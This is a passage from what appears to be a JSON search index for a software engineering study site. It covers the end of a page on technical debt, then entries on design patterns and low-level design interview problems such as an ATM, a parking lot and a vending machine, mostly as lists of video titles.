</ul>"},{"location":"system-design/low-level/concepts/technical-debt/#team-organization","title":"Team Organization","text":"<ul> <li>Dedicated Platform Teams: Teams focused on infrastructure and foundational improvements</li> <li>Rotating Ownership: Developers take turns owning debt reduction efforts</li> <li>Innovation Time: Google's 20% time model applied to technical improvement</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#key-takeaway","title":"Key Takeaway","text":"<p>Technical debt is an inevitable reality in software development\u2014the difference between high-performing and struggling teams lies not in the absence of debt, but in the discipline and systematic approach to managing it effectively.</p> <p>Success Factors: - Conscious Decision Making: Make deliberate choices about when to incur debt - Continuous Measurement: Track debt metrics and trends consistently - Balanced Allocation: Maintain sustainable balance between feature development and debt management - Clear Communication: Keep stakeholders informed about debt impact and remediation progress - Cultural Integration: Make debt management a natural part of the development process</p> <p>Remember: Technical debt is a tool that should work for your business objectives, not against them. With proper measurement, prioritization, and ongoing management, technical debt can be leveraged strategically while maintaining long-term system health and team productivity.</p>"},{"location":"system-design/low-level/design-pattern/behavioral/chain-of-responsibility/","title":"Chain of Responsibility Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/behavioral/chain-of-responsibility/#youtube","title":"Youtube","text":"<ul> <li>10. Design Logging System (Hindi) | Chain of Responsibility Design Pattern | System Design interview</li> </ul>"},{"location":"system-design/low-level/design-pattern/behavioral/observer/","title":"Observer Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/behavioral/observer/#youtube","title":"Youtube","text":"<ul> <li>3. Observer Design Pattern Explanation (Hindi) | Design Interview Question | LLD System Design</li> </ul>"},{"location":"system-design/low-level/design-pattern/behavioral/state/","title":"State Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/behavioral/state/#youtube","title":"Youtube","text":"<ul> <li>16. Design Vending Machine (Hindi) | LLD of Vending Machine | State Design Pattern | LLD question</li> </ul>"},{"location":"system-design/low-level/design-pattern/behavioral/state/#theory","title":"Theory","text":""},{"location":"system-design/low-level/design-pattern/behavioral/strategy/","title":"Strategy Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/behavioral/strategy/#youtube","title":"Youtube","text":"<ul> <li>2. Strategy Design Pattern explanation (Hindi) | LLD System Design | Design pattern in Java</li> </ul>"},{"location":"system-design/low-level/design-pattern/creational/factory/","title":"Factory Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/creational/factory/#youtube","title":"Youtube","text":"<ul> <li>5. Factory Pattern Vs Abstract Factory Pattern Explanation (Hindi) | Low Level System Design</li> </ul>"},{"location":"system-design/low-level/design-pattern/others/null-object-pattern/","title":"NULL Object Pattern","text":""},{"location":"system-design/low-level/design-pattern/others/null-object-pattern/#youtube","title":"Youtube","text":"<ul> <li>15. LLD of NULL Object Pattern (Hindi) | Design Null Object Pattern | Design Patterns</li> </ul>"},{"location":"system-design/low-level/design-pattern/structural/decorator/","title":"Decorator Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/structural/decorator/#youtube","title":"Youtube","text":"<ul> <li>4. Decorator Design Pattern Explanation with Java Coding (Hindi) | LLD System Design</li> </ul>"},{"location":"system-design/low-level/design-pattern/structural/proxy/","title":"Proxy Design Pattern","text":""},{"location":"system-design/low-level/design-pattern/structural/proxy/#youtube","title":"Youtube","text":"<ul> <li>13. Proxy Design Pattern Explanation (Hindi) | LLD | System Design Interview Question | Java</li> </ul>"},{"location":"system-design/low-level/designing/access-management-system/","title":"Design Access Management System","text":""},{"location":"system-design/low-level/designing/access-management-system/#website","title":"Website","text":"<ul> <li>Access Management System</li> </ul>"},{"location":"system-design/low-level/designing/account-balance-tracker/","title":"Design Account balance Tracker","text":""},{"location":"system-design/low-level/designing/account-balance-tracker/#website","title":"Website","text":"<ul> <li>Account Balance Tracker</li> </ul>"},{"location":"system-design/low-level/designing/air-traffic-controller/","title":"Design Air Traffic Controller System","text":"<ul> <li>Design An Air Traffic Controller | Google SWE Teaches Low Level Design Episode 6</li> </ul>"},{"location":"system-design/low-level/designing/atm/","title":"Design ATM Machine","text":""},{"location":"system-design/low-level/designing/atm/#youtube","title":"Youtube","text":"<ul> <li>17. LLD of ATM | ATM Low Level System Design | Design an ATM | Low Level Design Interview question</li> </ul>"},{"location":"system-design/low-level/designing/atm/#theory","title":"Theory","text":"<p>State Design pattern for different state of ATM (like card required, Pin required, pin accepted)</p> <p>Chain of commands pattern for dispensing the money like how many 500, how many 200 and so on</p>"},{"location":"system-design/low-level/designing/bookmyshow/","title":"Design BookMyShow","text":""},{"location":"system-design/low-level/designing/bookmyshow/#youtube","title":"Youtube","text":"<ul> <li>14. LLD of BookMyShow (Hindi) | Design MovieTicketBooking | Low Level System Design &amp; Concurrency</li> </ul>"},{"location":"system-design/low-level/designing/cache-system/","title":"Implement a Cache System","text":""},{"location":"system-design/low-level/designing/cache-system/#youtube","title":"Youtube","text":"<ul> <li>Cache | Google SWE Teaches Low Level Design Episode 2</li> </ul>"},{"location":"system-design/low-level/designing/car-rental-service/","title":"Design Car Rental Service","text":""},{"location":"system-design/low-level/designing/car-rental-service/#youtube","title":"Youtube","text":"<ul> <li>9. LLD of Car Rental System (Hindi) | ZoomCar Low Level Design | System Design Interview Question</li> <li>Low Level Designing (LLD -2) - Car Rental System | ZoomCar.com | Revv | Drivezy</li> <li>Uber/Ola Low Level System Design explained with CODE, UML Diagram | Easy &amp; Detailed Explanation!!<ul> <li>keertipurswani/Uber-Ola-Low-Level-Design</li> </ul> </li> </ul>"},{"location":"system-design/low-level/designing/chess-game/","title":"Design Chess","text":""},{"location":"system-design/low-level/designing/chess-game/#youtube","title":"Youtube","text":"<ul> <li>18. Design CHESS GAME, LLD Mock Interview | Low Level Design Coding Interview Question</li> </ul>"},{"location":"system-design/low-level/designing/elevator-system/","title":"Design a Elevator System","text":""},{"location":"system-design/low-level/designing/elevator-system/#youtube","title":"Youtube","text":"<ul> <li>Elevator System | Google SWE Teaches Low Level Design Episode 3</li> <li>8. Elevator System, Low Level Design (Hindi) | SDE LLD interview question | Design Elevator System</li> <li>Elevator System Design | Grokking the Object Oriented System Design Interview Question</li> </ul>"},{"location":"system-design/low-level/designing/locker-allocation-system/","title":"Design Locker Allocation System","text":""},{"location":"system-design/low-level/designing/locker-allocation-system/#website","title":"Website","text":"<ul> <li>Locker Allocation System</li> </ul>"},{"location":"system-design/low-level/designing/logging-system/","title":"Design a Logging System","text":""},{"location":"system-design/low-level/designing/logging-system/#youtube","title":"Youtube","text":"<ul> <li>10. Design Logging System (Hindi) | Chain of Responsibility Design Pattern | System Design interview</li> </ul>"},{"location":"system-design/low-level/designing/parking-lot/","title":"Implement a Parking Lot","text":""},{"location":"system-design/low-level/designing/parking-lot/#youtube","title":"Youtube","text":"<ul> <li>Design A Parking Garage | Google SWE Teaches Low Level Design Episode 4</li> <li>6. Parking Lot, Low Level Design (Hindi) | SDE2 Design interview question | Design Parking Lot</li> <li>Parking Lot Design | Grokking The Object Oriented Design Interview Question</li> </ul>"},{"location":"system-design/low-level/designing/parking-lot/#website","title":"Website","text":"<ul> <li>Parking Lot System</li> </ul>"},{"location":"system-design/low-level/designing/snake-and-ladder/","title":"Design Snake and Ladder Game","text":""},{"location":"system-design/low-level/designing/snake-and-ladder/#youtube","title":"Youtube","text":"<ul> <li>11. LLD of Snake and Ladder game (Hindi) | SDE system design interview question, Java implementation</li> <li>System Design : Snake and Ladder | Low Level System Design | Machine Coding | OOPS Design</li> </ul>"},{"location":"system-design/low-level/designing/stock-exchange-book/","title":"Design a Limit Order Book or Stock Exchange book","text":""},{"location":"system-design/low-level/designing/stock-exchange-book/#youtube","title":"Youtube","text":"<ul> <li>Design A Limit Order Book | Google SWE Teaches Low Level Design Episode 5</li> </ul>"},{"location":"system-design/low-level/designing/tic-tac-toe/","title":"Implement a Tic Tac Toe Game","text":""},{"location":"system-design/low-level/designing/tic-tac-toe/#youtube","title":"Youtube","text":"<ul> <li>TicTacToe | Google Gigachad SWE Teaches Low Level Design Episode 1</li> <li>Design Tic Tac Toe game (Hindi) | Tic-Tac-Toe LLD Java | Low Level Design, System Design</li> <li>Low-Level Design of Tic Tac Toe | LLD Tutorial of Tic Tac Toe | System Design Tutorial | SCALER</li> </ul>"},{"location":"system-design/low-level/designing/vending-machine/","title":"Design Vending Machine","text":""},{"location":"system-design/low-level/designing/vending-machine/#youtube","title":"Youtube","text":"<ul> <li>16. Design Vending Machine (Hindi) | LLD of Vending Machine | State Design Pattern | LLD question</li> </ul>"},{"location":"system-design/low-level/designing/vending-machine/#theory","title":"Theory","text":"<p>Using State Design Pattern</p>"}]}